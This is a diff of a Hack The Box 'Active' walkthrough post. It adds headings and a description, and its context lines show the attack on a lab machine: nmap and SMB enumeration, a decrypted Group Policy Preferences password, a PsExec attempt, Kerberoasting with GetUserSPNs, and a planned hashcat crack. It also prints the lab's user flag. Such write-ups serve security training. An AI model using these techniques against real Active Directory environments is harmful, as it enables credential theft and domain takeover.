@@ -5,7 +5,7 @@ categories: [Machines]
 tags: [CTF,HackTheBox]
 image: /assets/img/Machines/Active/Active.png  # SIZE 1200:630
 description: 
-    Change This
+    This post documents my walkthrough of the Active machine from Hack The Box. It involves Active Directory enumeration, SMB share analysis, Group Policy Preference exploitation, and Kerberoasting to ultimately gain administrator access.
 ---
 
 ## Enumeration
@@ -15,9 +15,9 @@ description:
 As always, the first step is to perform an Nmap scan.
 
 ```bash
-┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active/Nmap]                                                                                                                                                                                           
+┌──(krakenn㉿Phoenix)-[~/CPTS/Boxes/Active/Nmap]                
 └─$ sudo nmap -Pn -n -sV -sC -A -T4 10.10.10.100 -oA Default-Nmap                                                                                                                                                                          
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 00:37 +01                                                                                                                                                                            
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 00:37 +01    
 Nmap scan report for 10.10.10.100
 Host is up (0.052s latency).
 Not shown: 982 closed tcp ports (reset)
@@ -189,6 +189,8 @@ Attempting to enumerate SMB shares via anonymous access.
         fr--r--r--             3722 Sat Jul 21 11:38:11 2018    GptTmpl.inf
 ```
 
+### Groups.xml
+
 - During the enumeration of the SMB share, we identified the presence of a file named `Groups.xml`, which contains the username and cpasssword of a user. 
 
 ```xml
@@ -213,7 +215,7 @@ GPPstillStandingStrong2k18
 We can now use these credentials to enumerate the SMB shares again.
 
 ```bash
-┌──(krakenn㉿Phoenix)-[~]                                                                                                                                                                                                                  
+┌──(krakenn㉿Phoenix)-[~]                                                      
 └─$ smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'                                          
     ________  ___      ___  _______   ___      ___       __         _______
    /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
@@ -337,6 +339,8 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 
 - **User Flag: `1552882c279a0217d52873b6ef16a941`**
 
+## PsExec
+
 Now, let's attempt to access the machine using PsExec with the credentials we found. Note that this will only work if the user has administrative privileges on the target system.
 
 ```bash
@@ -357,6 +361,8 @@ Password:
 
 - As expected, the svc_tgs user does not have administrative privileges on the target machine, so we need to find an alternative approach.
 
+## Post Exploitation Enumeration
+
 - As we know, any authenticated user in an Active Directory environment can query information about the domain. We can leverage this by using tools like BloodHound to enumerate domain relationships and identify potential attack paths to the Domain Controller. However, since I’m feeling a bit lazy right now, I’ll skip BloodHound on this box and instead focus on finding Kerberoastable accounts using GetUserSPNs.
 
 ```bash
@@ -370,6 +376,8 @@ active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=
 ```
 
 - We discovered that the user `Administrator` is vulnerable to Kerberoasting.
+
+## Privilege Escalation → Kerberoasting
 
 ```bash
 ┌──(krakenn㉿Phoenix)-[~]
@@ -386,6 +394,8 @@ $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$49b5363310b16e02
 ```
 
 We’ve successfully retrieved the Ticket Granting Service (TGS) ticket for the Administrator account. We can save this hash to a file and attempt to crack it using Hashcat.
+
+### Hash Cracking
 
 To determine the appropriate Hashcat module, we can search online for 'Hashcat hash modes' and look for the one that matches hashes starting with `$krb5tgs$23$`. This corresponds to module `13100`
 
